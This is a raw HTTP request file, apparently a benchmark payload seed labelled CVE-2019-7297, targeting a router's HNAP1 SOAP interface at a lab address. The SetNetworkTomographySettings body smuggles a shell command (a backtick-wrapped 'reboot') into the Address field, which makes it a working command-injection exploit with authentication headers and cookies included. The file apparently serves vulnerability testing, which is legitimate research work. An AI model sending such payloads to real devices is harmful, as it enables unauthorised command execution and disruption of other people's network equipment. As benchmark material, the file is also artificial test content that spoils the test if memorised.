Vulnerabilities/CVE-2019-7297/BM-2024-00002-payload.seed

POST /HNAP1/ HTTP/1.1
Host: 192.168.33.132:32910
Content-Length: 442
Accept: */*
X-Requested-With: XMLHttpRequest
HNAP_AUTH: 5A6659A7B6F1C6AD27E6EDCC12634779 1725687085
SOAPAction: "http://purenetworks.com/HNAP1/GetWanSettings"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36
Content-Type: text/xml; charset=UTF-8
Origin: http://192.168.33.132:32910
Referer: http://192.168.33.132:32910/Network.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: uid=ujcI4DPmyw; PrivateKey=C8B843B87E7C03EF5F224D6D4949A7F1; timeout=0
Connection: close

<?xml version='1.0' encoding='utf-8'?><soap:Envelope xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance' xmlns:xsd='http://www.w3.org/2001/XMLSchema' xmlns:soap='http://schemas.xmlsoap.org/soap/envelope/'>  <soap:Body>    <SetNetworkTomographySettings xmlns='http://purenetworks.com/HNAP1/'>      <Address>;'`reboot`';</Address>      <Number>4</Number>          <Size>4</Size>     </SetNetworkTomographySettings></soap:Body></soap:Envelope>